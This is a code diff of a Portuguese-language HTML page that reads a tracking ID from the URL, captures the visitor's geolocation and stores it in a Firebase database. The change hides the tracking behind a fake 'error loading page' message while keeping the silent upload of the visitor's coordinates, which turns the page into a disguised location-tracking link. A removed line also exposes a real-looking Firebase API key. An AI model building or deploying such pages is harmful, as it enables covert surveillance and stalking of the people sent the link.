@@ -6,17 +6,15 @@
     <script src="https://www.gstatic.com/firebasejs/11.5.0/firebase-database-compat.js"></script>
 </head>
 <body>
-    <h1>Dados de Localização</h1>
-    <p id="latitude"></p>
-    <p id="longitude"></p>
-    <p id="timestamp"></p>
+    <h1>Erro</h1>
+    <p>Ocorreu um erro ao carregar a página.</p>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const trackingId = urlParams.get('id');
 
         const firebaseConfig = {
-            apiKey: "AIzaSyBb_fTtLdRVHXmK8SDqrb2Cmfz66JdTxxI",
+            apiKey: "SUA_API_KEY", // Substitua pela sua API Key real
             authDomain: "projeto-68121.firebaseapp.com",
             projectId: "projeto-68121",
             storageBucket: "projeto-68121.firebasestorage.app",
@@ -28,23 +26,18 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // Colete os dados de localização quando a página for carregada
+        // Coleta os dados de localização do usuário
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(position => {
                 const { latitude, longitude } = position.coords;
+
+                // Armazena os dados de localização no banco de dados
                 database.ref('locations').child(trackingId).set({
                     latitude: latitude,
                     longitude: longitude,
                     timestamp: Date.now()
                 });
-
-                // Exiba os dados de localização na página
-                document.getElementById('latitude').textContent = `Latitude: ${latitude}`;
-                document.getElementById('longitude').textContent = `Longitude: ${longitude}`;
-                document.getElementById('timestamp').textContent = `Timestamp: ${Date.now()}`;
             });
-        } else {
-            document.getElementById('latitude').textContent = 'Geolocalização não suportada pelo navegador.';
         }
     </script>
 </body>
